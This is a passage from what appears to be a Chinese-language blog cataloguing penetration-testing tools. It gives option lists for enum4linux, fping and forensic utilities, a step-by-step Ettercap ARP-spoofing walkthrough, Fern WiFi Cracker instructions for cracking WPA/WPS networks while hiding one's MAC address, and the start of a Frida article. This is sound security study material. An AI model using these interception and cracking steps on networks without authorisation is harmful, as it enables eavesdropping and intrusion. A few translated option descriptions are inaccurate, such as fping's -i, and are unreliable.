alt="image-20220411183237570"></p><p>选项:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">-U<br>获取用户列表<br><br>-M<br>get machine list*<br><br>-S<br>获取共享列表<br><br>-P<br>获取密码策略信息<br><br>-G<br>获取组和成员列表<br><br>-d<br>详细说明，适用于-U和-S<br><br>-u user<br>指定要使用的用户名（默认为“”）<br><br>-p pass<br>指定要使用的密码（默认为“”）<br></code></pre></td></tr></table></figure><p>附加选项:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a<br>执行所有简单的枚举（-U -S -G -P -r -o -n -i）。如果您未提供其他任何选项，则启用此选项。<br><br>-h<br>显示帮助信息并退出<br><br>-r<br>通过RID循环枚举用户<br><br>-R range<br>要枚举的范围（默认值：500-550、1000-1050，暗含-r）<br><br>-K n<br>继续搜索RID，直到n个连续的RID与用户名不对应为止。 Impies RID范围以999999结尾。对于DC很有用。<br><br>-l<br>通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DC<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411183850660.png" alt="image-20220411183850660"></p><p>观察不同参数的数据包，发现enum4linux在扫描的时候会先发送下面红框内的数据，追踪流发现数据格式几乎完全一致</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411183924965.png" alt="image-20220411183924965"></p><h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><p><strong>ettercap是一款强大的嗅探工具。</strong></p><h3 id="ettercap主页面"><a href="#ettercap主页面" class="headerlink" title="ettercap主页面"></a>ettercap主页面</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184151666.png" alt="image-20220411184151666"></p><h3 id="ettercap-mitm方法"><a href="#ettercap-mitm方法" class="headerlink" title="ettercap mitm方法"></a>ettercap mitm方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ARP                                    ARP欺骗<br>ICMP                                  发送ICMP数据包重定向到kali，然后由kali转发(只有受害者发出的数据包经过kali)<br>DHCP                                发送DHCP数据包，让受害者认为kali是路由器，(只有受害者发出的数据包经过kali)<br>Swith Port Stealing            ARP静态绑定欺骗<br>NDP                                   ipv6协议欺骗技术<br></code></pre></td></tr></table></figure><h3 id="实例演示-arp欺骗"><a href="#实例演示-arp欺骗" class="headerlink" title="实例演示-arp欺骗"></a>实例演示-<a href="https://so.csdn.net/so/search?q=arp&spm=1001.2101.3001.7020">arp</a>欺骗</h3><p><strong>1.打开ettercap，选择你要使用的网卡，点击”对号”。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184437941.png" alt="image-20220411184437941"></p><p><strong>2.点击”搜索”按钮，进行主机发现。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184514872.png" alt="image-20220411184514872"></p><p><strong>3.点击”红色方框里面的按钮”，我们可以查看”host list”.</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184540732.png" alt="image-20220411184540732"></p><p><strong>4.将想要欺骗的网关和受害者分别添加到”add to target 1”和”add to target 2”。(需要至少两个192ip网关)</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184640138.png" alt="image-20220411184640138"></p><p><strong>5.点击”圆圈”，选择”arp poisoning spoofing”。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184652866.png" alt="image-20220411184652866"></p><p><strong>6.选择”sniff remote connections”，然后点击”OK”。这样就配置完成，ettercap会自动开始arp欺骗。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184705664.png" alt="image-20220411184705664"></p><p><strong>7.我们在受害者主机上可以看到网关的mac地址，已经替换成192.168.3.23的mac地址。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411184727150.png" alt="image-20220411184727150"></p><h2 id="ettercap-graphical"><a href="#ettercap-graphical" class="headerlink" title="ettercap-graphical"></a>ettercap-graphical</h2><p>跟gttercap一样  特地写了个图形模式  可实际上两个都是图形牧师</p><h2 id="exe2hex"><a href="#exe2hex" class="headerlink" title="exe2hex"></a>exe2hex</h2><p>提过多种编码方式转换文件</p><p>转换成二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h,--<span class="hljs-built_in">help</span><br>显示帮助信息并退出<br><br>-x EXE<br>EXE二进制文件转换<br><br>-s<br>从STDIN读取<br><br>-b BAT<br>BAT输出文件（DEBUG.exe方法-x86）<br><br>-p POSH<br>PoSh输出文件（PowerShell方法-x86 / x64）<br><br>-e<br>URL编码输出<br><br>-r TEXT<br>pRefix-在每行命令之前添加的文本<br><br>-f TEXT<br>suFfix-在每行命令后添加的文本<br><br>-l INT<br>每行最大十六进制值<br><br>-c<br>在转换之前克隆并压缩文件（使用-cc进行更高压缩）<br><br>-t<br>创建一个Expect文件，以自动进行Telnet会话。<br><br>-w<br>创建一个Expect文件，以自动执行WinEXE会话。<br><br>-v<br>启用详细模式<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411190735178.png" alt="image-20220411190735178"></p><h1 id="F"><a href="#F" class="headerlink" title="F"></a>F</h1><h2 id="Fakelogon"><a href="#Fakelogon" class="headerlink" title="Fakelogon"></a>Fakelogon</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653578752&idx=1&sn=862eef80bdac97774e365534e33a8693&chksm=811b7042b66cf954544947130dd671fe0a062b39310af794d5f7cdaf0bde05ca0df9e73ccfaf&mpshare=1&scene=23&srcid=0416TxUfJ8xijnjXmm6ob86J&sharer_sharetime=1650113928776&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&amp;mid=2653578752&amp;idx=1&amp;sn=862eef80bdac97774e365534e33a8693&amp;chksm=811b7042b66cf954544947130dd671fe0a062b39310af794d5f7cdaf0bde05ca0df9e73ccfaf&amp;mpshare=1&amp;scene=23&amp;srcid=0416TxUfJ8xijnjXmm6ob86J&amp;sharer_sharetime=1650113928776&amp;sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd</a></p><h2 id="Firefox-ESR"><a href="#Firefox-ESR" class="headerlink" title="Firefox ESR"></a>Firefox ESR</h2><p>火狐浏览器</p><h2 id="faraday-IDE-start"><a href="#faraday-IDE-start" class="headerlink" title="faraday IDE start"></a>faraday IDE start</h2><p>一款多功能协同式渗透测试工具&amp;漏洞管理平台</p><p>新版本的Faraday引入了一个新的概念，即IPE(整合型渗透测试环境)，也就是所谓的多用户渗透测试IDE。在Faraday的帮助下，广大研究人员可以在安全审计的过程中跟其他用户分享分析数据，或查询其他用户提供的分析结果。</p><p>值得一提的是，除了数据方面的共享之外，Faraday还可以将社区中可用的工具以多用户协同使用的方式提供给大家。</p><p>毫无疑问，Faraday提供了一种发送、上传和共享漏洞的新方式，因为新版Faraday整合了Service Now，因此我们的选择将会更加丰富</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411191330688.png" alt="image-20220411191330688"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411191422417.png" alt="image-20220411191422417"></p><p>faraday IDE stopFaraday可以将用户加载的数据以不同的可视化效果显示出来，这对于管理人员和渗透测试人员来说都非常实用</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411191919071.png" alt="image-20220411191919071"></p><p>整合了Jira</p><p>Faraday允许我们在不需要填写任何表单的情况下向Jira发送多个漏洞，因此，我们不必在每次提交漏洞时输入我们的Jira凭证，我们可以直接在工具配置项中进行修改或更换项目。</p><p>Burp插件翻新1、 Burp插件可直接使用多种Faraday服务器API，因此我们将不再需要GTK客户端；</p><p>2、 插件采用Java语言重写；</p><p>3、 添加了双因素身份验证(2FA)支持来增强安全性；</p><h2 id="fern-wifi-cracker"><a href="#fern-wifi-cracker" class="headerlink" title="fern wifi cracker"></a>fern wifi cracker</h2><p>Fern Wifi Cracker是一种无线安全审计和攻击软件编写的程序，使用Python编程语言和Python的Qt图形界面库，该程序是能够破解和恢复WEP、WPA、WPS键和无线或以太网上运行其他基于网络的攻击基于网络的。</p><h3 id="使用这个工具前需要一张网卡，-下面是网卡部署："><a href="#使用这个工具前需要一张网卡，-下面是网卡部署：" class="headerlink" title="使用这个工具前需要一张网卡， 下面是网卡部署："></a>使用这个工具前需要一张网卡， 下面是网卡部署：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411192823023.png" alt="image-20220411192823023"></p><p><strong>使用这款工具前最好自定义一个MAC地址，以便隐藏我们的真实MAC地址信息。</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411192948233.png" alt="image-20220411192948233"></p><p><strong>由于Fern WiFi Cracker是图形界面的，不需要敲命令，所以操作起来比Aircrack-ng简单了许多。</strong></p><p>首先选择<strong>Interface</strong>，如下图中的<strong>wlan0</strong>，然后点击<strong>蓝色</strong>Wifi图标使状态变为<strong>Active</strong></p><p> <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411193129963.png" alt="image-20220411193129963"></p><p>软件会自动识别附近的WEP和WPA网络，这里我们只搜到了WPA类型的网络，点击WPA图标。</p><p>进入以下界面，选择我们需要破解的Wifi SSID名称，然后点击Browse浏览字典文件。</p><p>如果该热点支持WPS就选择WPS Attack模式，最后点击右侧的Wifi Attack按钮开始破解</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411193252883.png" alt="image-20220411193252883"></p><p>和Aircrack-ng一样耐心等待，运气好的话就会看到破解成功的界面:</p><p> Fern WiFi Cracker除了破解WEP、WPA&#x2F;WPA2加密网络外，还具备MAC地址地理位置追踪、Cookie劫持以及对HTTP、Telnet、FTP服务的爆破功能。</p><p>但不幸的是MAC地址地理位置追踪功能由于调用的服务在2011年已经关闭，所以无法使用此项功能了。</p><p>Cookie劫持功能未测试成功，只抓到本机的Cookie信息</p><h2 id="ffind"><a href="#ffind" class="headerlink" title="ffind"></a>ffind</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411194053536.png" alt="image-20220411194053536"></p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a<br>查找所有出现的inode。<br><br>-d<br>仅查找已删除的条目。<br><br>-f fstype<br>标识映像的文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-u<br>仅查找已删除的条目。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o imgoffset<br>文件系统在映像中开始的扇区偏移量。<br><br>-b dev_sector-size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-v<br>详细输出到stderr。<br><br>-V<br>显示版本信息<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的指示），则后续的图像段将自动包含在内。<br>inode要查找的inode的整数。<br>该程序搜索所有目录条目以查找给定的inode。 当已使用ifind（1）从磁盘单元地址中识别出一个索引节点时，这很有用。<br></code></pre></td></tr></table></figure><h2 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h2><p>Fierce是使用多种技术来扫描目标主机IP地址和主机名的一个DNS服务器枚举工具。它可以快速获取指定域名的DNS服务器，并检查是否存在区域传输（Zone Transfer）漏洞。如果不存在该漏洞，会自动执行暴力破解，以获取子域名信息。而且，对获取的IP地址，还会遍历周边IP地址，以获取更多的信息。最后，还会将IP地址进行分段统计，以便于后期其它工具扫描，如Nmap。 </p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411194815618.png" alt="image-20220411194815618"></p><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例:"></a>实例:</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411195435650.png" alt="image-20220411195435650"></p><h2 id="fls"><a href="#fls" class="headerlink" title="fls"></a>fls</h2><h3 id="描述：-6"><a href="#描述：-6" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411195642382.png" alt="image-20220411195642382"></p><h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数:"></a>参数:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a<br>显示“.” 和“ ..”目录条目（默认情况下不会）<br><br>-d<br>仅显示已删除的条目<br><br>-D<br>仅显示目录条目<br><br>-f fstype<br>文件系统的类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-F<br>仅显示文件（所有非目录）条目。<br><br>-l<br>以长格式显示文件详细信息。 显示以下内容：file_type inode file_name mod_time acc_time chg_time cre_time size uid gid<br><br>-m mnt<br>以时间机器格式显示文件，以便可以使用mactime（1）创建时间线。 作为mnt给出的字符串将在文件名之前作为安装点（例如/ usr）。<br><br>-p<br>显示每个条目的完整路径。 默认情况下，它以“ +”号表示递归运行的目录深度。<br><br>-r<br>递归显示目录。 这不会跟随已删除的目录，因为它不会。<br><br>-s seconds<br>原始系统的时间偏差（以秒为单位）。 例如，如果原始系统的速度慢了100秒，则该值为-100。 仅在给出-l或-m的情况下使用。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o imgoffset<br>文件系统在映像中开始的扇区偏移量。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411200710362.png" alt="image-20220411200710362"></p><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>ctf工具  用于分割 和binwalk差不多</p><p>相对来说<code>binwalk</code>更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看<code>foremost</code>。</p><p>foremost是一个控制台程序，用于根据页眉，页脚和内部数据结构恢复文件。Foremost可以处理图像文件，例如由dd，Safeback，Encase等生成的图像文件，或直接在驱动器上。页眉和页脚可以由配置文件指定，也可以使用命令行开关指定内置文件类型。这些内置类型查看给定文件格式的数据结构，从而实现更可靠，更快速的恢复。在数字取证中和CTF中常用来恢复、分离文件。它默认支持19种类型文件(jpg, gif, png, bmp, avi, exe, mpg, mp4, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, html, cpp 等文件)的扫描识别恢复，还可以通过(通过配置它的配置文件foremost.conf)增加新的支持类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">c:\&gt; foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;<span class="hljs-built_in">type</span>&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;]<br>    [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;<span class="hljs-built_in">dir</span>&gt;] [-i &lt;file]<br><br>-V  - 显示版权信息并退出<br>-t  - 指定文件类型.  (-t jpeg,pdf ...)<br>-d  - 打开间接块检测 (针对UNIX文件系统)<br>-i  - 指定输入文件 (默认为标准输入)<br>-a  - 写入所有的文件头部, 不执行错误检测(损坏文件)<br>-w  - 向磁盘写入审计文件，不写入任何检测到的文件<br>-o  - 设置输出目录 (默认为./output)<br>-c  - 设置配置文件 (默认为foremost.conf)<br>-q  - 启用快速模式. 在512字节边界执行搜索.<br>-Q  - 启用安静模式. 禁用输出消息.<br>-v  - 详细模式. 向屏幕上记录所有消息。<br><br></code></pre></td></tr></table></figure><p>实例：</p><p>可以参考<a href="https://blog.csdn.net/john_david_/article/details/87273152">https://blog.csdn.net/john_david_/article/details/87273152</a></p><h2 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h2><p>Fping程序类似于ping（ping是通过ICMP（网络控制信息协议InternetControl Message Protocol）协议回复请求以检测主机是否存在）。Fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。</p><p>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p><p>Fping类似于ping，但比ping强大。Fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。<br>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p><h3 id="fping工具的参数说明："><a href="#fping工具的参数说明：" class="headerlink" title="fping工具的参数说明："></a>fping工具的参数说明：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a<br>Lists targets that responded<br>显示可ping通的目标<br><br>-A<br>Lists targets by address instead of hostname<br>将目标以ip地址的形式显示<br><br>-b &lt;num&gt;<br>Sends &lt;num&gt; bytes of data per ICMP packet (default 56)<br>ping 数据包的大小。（默认为56）<br><br>-B &lt;f&gt;<br>Tells fping to <span class="hljs-built_in">wait</span> &lt;f&gt; <span class="hljs-built_in">times</span> longer <span class="hljs-keyword">for</span> a reply after each successive failed request (default 1.5)<br>设置指数反馈因子到f<br><br>-c &lt;num&gt;<br>Number of Pings to send to each target (default 1)<br>ping每个目标的次数 (默认为1)<br><br>-C &lt;num&gt;<br>Same as above but prints additional statistics <span class="hljs-keyword">for</span> each host<br>同-c，返回的结果为冗长格式<br><br>-e<br>Displays elapsed time on <span class="hljs-built_in">return</span> packets<br>显示返回数据包所费时间<br><br>-f &lt;file&gt;<br>Reads the target list from &lt;file&gt; (use <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">for</span> standard input) (only <span class="hljs-keyword">if</span> no -g specified)<br>从文件获取目标列表( - 表示从标准输入)(不能与 -g 同时使用)<br><br>-g<br>Tells fping to generate a target list by specifying the start and end address (ex. ./fping -g 192.168.1.0 192.168.1.255) or an IP/subnet mask (ex. ./fping -g 192.168.1.0/24)<br>通过指定开始和结束地址来生成目标列表（例如：./fping –g 192.168.1.0 192.168.1.255）或者一个IP/掩码形式（例如：./fping –g 192.168.1.0/24）<br><br>-i &lt;num&gt;<br>Interval (<span class="hljs-keyword">in</span> milliseconds) to <span class="hljs-built_in">wait</span> between Pings (default 25)<br>设置ip的TTL值 (生存时间)<br><br>-l<br>Sends Pings forever<br>循环发送ping<br><br>-m<br>Pings multiple interfaces on target host<br>ping目标主机的多个网口<br><br>-n<br>Displays targets by name (-d is equivalent)<br>将目标以主机名或域名显示(等价于 -d )<br><br>-p &lt;num&gt;<br>Interval (<span class="hljs-keyword">in</span> milliseconds) between Pings to an individual target (<span class="hljs-keyword">in</span> looping and counting modes, default 1000)<br>对同一个目标的ping包间隔(毫秒) (在循环和统计模式中，默认为1000)<br><br>-q<br>Doesn<span class="hljs-string">&#x27;t show per-target/per-Ping results</span><br><span class="hljs-string">安静模式(不显示每个目标或每个ping的结果)</span><br><span class="hljs-string"></span><br><span class="hljs-string">-Q &lt;num&gt;</span><br><span class="hljs-string">Same as -q, but show summary every &lt;num&gt; seconds</span><br><span class="hljs-string">同-q, 但是每n秒显示信息概要</span><br><span class="hljs-string"></span><br><span class="hljs-string">-r &lt;num&gt;</span><br><span class="hljs-string">When a host doesn&#x27;</span>t respond, retries the host &lt;num&gt; <span class="hljs-built_in">times</span> (default 3)<br>当ping失败时，最大重试次数(默认为3次)<br><br>-s<br>Displays summary statistics<br>打印最后的统计数据<br><br>-t &lt;num&gt;<br>Timeout (<span class="hljs-keyword">in</span> milliseconds) <span class="hljs-keyword">for</span> individual targets (default 500)<br>单个目标的超时时间(毫秒)(默认500)<br><br>-u<br>Displays targets that are unreachable<br>显示不可到达的目标<br><br>-v<br>Displays version number<br>显示版本号<br></code></pre></td></tr></table></figure><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例:"></a>实例:</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411201755388.png" alt="image-20220411201755388"></p><h2 id="fsstat"><a href="#fsstat" class="headerlink" title="fsstat"></a>fsstat</h2><h3 id="描述：-7"><a href="#描述：-7" class="headerlink" title="描述："></a>描述：</h3><p>显示文件系统的一般详细信息。<br>  sstat显示与文件系统关联的详细信息。 该命令的输出是文件系统特定的。 至少要给出元数据值（索引节点号）和内容单元（块或簇）的范围。 还给出了超级块的详细信息，例如安装时间和功能。 对于使用组（FFS和EXT2FS）的文件系统，列出了每个组的布局。<br>对于FAT文件系统，FAT表以压缩格式显示。 请注意，数据位于扇区而不是簇中。</p><h3 id="参数：-2"><a href="#参数：-2" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">-t <span class="hljs-built_in">type</span><br>仅打印文件系统类型。<br><br>-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o imgoffset<br>文件系统在映像中开始的扇区偏移量。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>打印版本信息<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411203307255.png" alt="image-20220411203307255"></p><p>仅仅支持磁盘文件</p><h3 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h3><h4 id="Frida自吐证书密码"><a href="#Frida自吐证书密码" class="headerlink" title="Frida自吐证书密码"></a>Frida自吐证书密码</h4><p>原创 tale <a href="javascript:void(0);">Tide安全团队</a> <em>2022-04-27 17:03</em></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119672.png" alt="图片"></p><h4 id="双向认证APP自吐密码"><a href="#双向认证APP自吐密码" class="headerlink" title="双向认证APP自吐密码"></a>双向认证APP自吐密码</h4><p>在许多业务非常聚焦比如行业应用、银行、公共交通、游戏等行业，C&#x2F;S架构中服务器高度集中，对应用的版本控制非常严格，这时候就会在服务器上部署对app内置证书的校验代码。<br>抓包出现如下提示时，我们确定出此APP为服务器校验app客户端证书</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119298.jpeg" 